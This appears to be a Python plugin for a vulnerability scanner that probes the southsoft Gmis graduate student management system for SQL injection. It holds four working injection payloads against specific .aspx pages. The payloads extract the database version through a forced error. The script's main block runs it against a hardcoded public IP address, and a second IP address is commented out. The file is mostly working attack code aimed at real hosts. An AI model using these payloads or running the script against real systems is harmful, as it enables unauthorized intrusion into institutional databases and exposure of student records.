#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:南软研究生信息管理系统SQL注入漏洞大礼包2
#Refer:http://www.wooyun.org/bugs/wooyun-2010-098771，http://www.wooyun.org/bugs/wooyun-2010-098767等

def assign(service,arg):
    if service=="southsoft":
        return True,arg 


def  audit(arg):
    ps=[
        'Gmis/xw/EditdbxxInfo_bs.aspx?xh=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
        'Gmis/xw/dbtljgxg.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
        'Gmis/Byyxwgl/dbwyhwh.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
        'Gmis/xw/xwsb_xlssEdit.aspx?xh=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url) 
        if code==500 and "GAOJIMicrosoft" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('southsoft','http://61.187.179.68:8080/')[1])
    #audit(assign('southsoft','http://211.64.205.214/')[1])